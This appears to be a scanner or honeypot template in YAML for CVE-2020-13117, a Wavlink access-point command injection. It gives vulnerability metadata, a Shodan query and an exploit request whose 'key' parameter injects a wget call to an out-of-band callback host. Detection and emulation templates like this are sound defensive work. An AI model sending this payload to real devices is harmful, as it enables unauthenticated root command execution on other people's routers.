id: CVE-2020-13117
info:
  name: Wavlink Multiple AP - Remote Command Injection
  author: gy741
  description: Wavlink products are affected by a vulnerability that may allow remote
    unauthenticated users to execute arbitrary commands as root on Wavlink devices.
    The user input is not properly sanitized which allows command injection via the
    "key" parameter in a login request. It has been tested on Wavlink WN575A4 and
    WN579X3 devices, but other products may also be affected.
  severity: critical
  impact: 'Successful exploitation of this vulnerability could lead to unauthorized
    access, data leakage, and potential compromise of the affected device.

    '
  remediation: 'Apply the latest firmware update provided by the vendor to mitigate
    this vulnerability.

    '
  reference:
  - https://blog.0xlabs.com/2021/02/wavlink-rce-CVE-2020-13117.html
  - https://nvd.nist.gov/vuln/detail/CVE-2020-13117
  - https://github.com/20142995/sectool
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-13117
    cwe-id: CWE-77
    epss-score: 0.07866
    epss-percentile: 0.94083
    cpe: cpe:2.3:o:wavlink:wn575a4_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: wavlink
    product: wn575a4_firmware
    shodan-query: http.title:"Wi-Fi APP Login"
  tags: cve,cve2020,wavlink,rce,oast,router
traps:
- request:
    method: POST
    path: /cgi-bin/login.cgi
    headers:
      Origin: http://{{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Accept-Encoding: gzip, deflate
    body: 'newUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.1.66&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=wifi.wavlink.com&key=%27%3B%60wget+http%3A%2F%2F{{interactsh-url}}%3B%60%3B%23&password=asd&lang_select=en

      '
  response:
    status_code: 200
    headers: {}
    body: parent.location.replace
